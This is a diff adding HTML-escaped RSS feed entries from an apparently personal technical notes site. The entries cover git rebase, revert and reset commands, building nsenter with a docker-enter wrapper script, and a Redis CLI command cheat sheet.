+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rebase master
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git rebase master topic
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># would be&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># A&amp;#39;--B&amp;#39;--C&amp;#39; topic&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># /&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D---E---F---G master&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="branch-rebase">branch rebase&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-mermaid" data-lang="mermaid">graph LR
+E --&amp;gt; A --&amp;gt; B --&amp;gt; C(C topic)
+D --&amp;gt; E --&amp;gt; F --&amp;gt; G(G master)
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>mkdir git-repo &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#204a87">cd&lt;/span> git-repo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git init --bare
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">export&lt;/span> &lt;span style="color:#000">remote_url&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>&lt;span style="color:#204a87">pwd&lt;/span>&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">cd&lt;/span> ..
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git clone &lt;span style="color:#000">$remote_url&lt;/span> git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">cd&lt;/span> git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>uuidgen&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &amp;gt; D &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git add . &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git commit -m &lt;span style="color:#4e9a06">&amp;#39;D&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git push -u origin master
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D - E&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>uuidgen&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &amp;gt; E &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git add . &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git commit -m &lt;span style="color:#4e9a06">&amp;#39;E&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git push -u origin master
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git checkout -b topic
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git switch master
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D - E - F&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>uuidgen&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &amp;gt; F &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git add . &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git commit -m &lt;span style="color:#4e9a06">&amp;#39;F&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git push -u origin master
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D - E - F - G&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>uuidgen&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &amp;gt; G &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git add . &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git commit -m &lt;span style="color:#4e9a06">&amp;#39;G&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git push -u origin master
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git switch topic
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># A&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># / &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D - E - F&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>uuidgen&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &amp;gt; A &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git add . &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git commit -m &lt;span style="color:#4e9a06">&amp;#39;A&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git push -u origin topic
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># A - B&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># / &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D - E - F&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>uuidgen&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &amp;gt; B &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git add . &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git commit -m &lt;span style="color:#4e9a06">&amp;#39;B&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git push -u origin topic
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># A - B - C topic&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># / &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># D - E - F master&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>uuidgen&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &amp;gt; C &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git add . &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git commit -m &lt;span style="color:#4e9a06">&amp;#39;C&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git push -u origin topic
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Git Revert</title><link>/note/ops/vcs/git-revert/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/git-revert/</guid><description>
+&lt;h2 id="revert">revert&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># revert to previous commit&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git revert &amp;lt;previous-commit&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="reset">reset&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># discard changes and reset files to master&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git reset --hard origin/master
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git reset --hard HEAD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># or save changes&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git reset --soft HEAD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># discard changes and reset to current branch&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git checkout . &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> git clean -xdf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Nsenter</title><link>/note/container/docker/nsenter/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/container/docker/nsenter/</guid><description>
+&lt;h2 id="nsenter">nsenter&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>wget https://www.kernel.org/pub/linux/utils/util-linux/v2.32/util-linux-2.32.tar.gz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tar -zxf util-linux-2.32.tar.gz &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#204a87">cd&lt;/span> util-linux-2.32
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./configure
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># make &amp;amp;&amp;amp; make install，可能影响操作系统底层工具&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cp nsenter /usr/local/bin/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="docker-enter">&lt;code>docker-enter&lt;/code>&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#!/bin/sh
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span> -e &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>dirname &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$0&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>/nsenter &lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#204a87;font-weight:bold">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># with boot2docker, nsenter is not in the PATH but it is in the same folder&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">NSENTER&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>dirname &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$0&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>/nsenter
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">NSENTER&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>nsenter
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span> -z &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$1&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#204a87;font-weight:bold">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Usage: &lt;/span>&lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>basename &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$0&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>&lt;span style="color:#4e9a06"> CONTAINER [COMMAND [ARG]...]&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Enters the Docker CONTAINER and executes the specified COMMAND.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;If COMMAND is not specified, runs an interactive shell in CONTAINER.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">PID&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>docker inspect --format &lt;span style="color:#4e9a06">&amp;#34;{{.State.Pid}}&amp;#34;&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$1&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span> -z &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$PID&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#204a87;font-weight:bold">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87">exit&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87">shift&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">OPTS&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;--target &lt;/span>&lt;span style="color:#000">$PID&lt;/span>&lt;span style="color:#4e9a06"> --mount --uts --ipc --net --pid --&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span> -z &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$1&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#204a87;font-weight:bold">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># No command given.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># Use su to clear all host environment variables except for TERM,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># initialize the environment variables HOME, SHELL, USER, LOGNAME, PATH,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># and start a login shell.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$NSENTER&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#000">$OPTS&lt;/span> su - root
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic"># Use env to clear all host environment variables.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$NSENTER&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#000">$OPTS&lt;/span> env --ignore-environment -- &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$@&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Redis Cli</title><link>/note/data/redis/redis-cli/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/data/redis/redis-cli/</guid><description>
+&lt;h2 id="事务">事务&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;h4 id="multi-开启事务">&lt;code>multi&lt;/code> 开启事务&lt;/h4>
+&lt;/li>
+&lt;li>
+&lt;h4 id="exec-提交事务执行队列中的所有命令">&lt;code>exec&lt;/code> 提交事务，执行队列中的所有命令&lt;/h4>
+&lt;/li>
+&lt;li>
+&lt;h4 id="discard-放弃执行事务清空事务队列">&lt;code>discard&lt;/code> 放弃执行事务，清空事务队列&lt;/h4>
+&lt;/li>
+&lt;li>
+&lt;h4 id="watch-key1-key2-监听某个键如果在exec之前被更改了则放弃执行事务">&lt;code>watch key1 [key2...]&lt;/code> 监听某个键，如果在exec之前被更改了，则放弃执行事务&lt;/h4>
+&lt;/li>
+&lt;li>
+&lt;h4 id="unwatch-key1-取消目前对键的监视客户端断开连接也会取消监视">&lt;code>unwatch [key1...]&lt;/code> 取消目前对键的监视，客户端断开连接也会取消监视&lt;/h4>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="发布与订阅">发布与订阅&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;h4 id="subscribe-key1-key2-订阅频道支持通配符的版本-psubscribe">&lt;code>subscribe key1 [key2...]&lt;/code> 订阅频道，支持通配符的版本 &lt;code>psubscribe&lt;/code>&lt;/h4>
+&lt;/li>
+&lt;li>
+&lt;h4 id="unsubscribe-key1-key2-取消订阅频道支持通配符的版本-punsubscribe">&lt;code>unsubscribe key1 [key2...]&lt;/code> 取消订阅频道，支持通配符的版本 &lt;code>punsubscribe&lt;/code>&lt;/h4>
+&lt;/li>
+&lt;li>
+&lt;h4 id="publish-key-value-key2-发布消息到频道">&lt;code>publish key value [key2...]&lt;/code> 发布消息到频道&lt;/h4>
+&lt;/li>
+&lt;li>
+&lt;h4 id="pubsub-自省">&lt;code>pubsub&lt;/code> 自省&lt;/h4>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="类型操作">类型操作&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>keys *
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="string">string&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">set&lt;/span> k v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># string&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">type&lt;/span> k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>get k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># return old value&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>getset k v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mset k1 v1 k2 v2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mget k1 k2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># set if not exsit&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msetnx k1 v1 k2 v2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># append to the tail&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>append k v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># string legnth&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>strlen k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># increment a number string, k++&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>incr k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>decr k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># k += d&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>incrby k d
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>decrby k d
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 覆写，从偏移量offset 开始&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>setrange k offset v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 子串，含两端&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>getrange k start end
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 设置或清除指定偏移量上的位&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>setbit k offset v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>setnx k v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># expire in seconds&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">set&lt;/span> k v ex seconds nx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="list">list&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将一个或多个值 value插入到列表 key 的表头&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lpush k v1 v2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># push if exist&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lpushx k v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回列表 key 中指定区间内的元素，区间以偏移量 start=0 和 end=-1 指定&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lrange key start end
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 移除并返回列表 key 的头元素&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lpop k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>llen k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 从头部开始移除列表中与参数 value 相等的元素&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lrem k count v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lset k index v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回列表 key 中，下标为 index 的元素&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lindex k index
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 修剪&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ltrim k start end
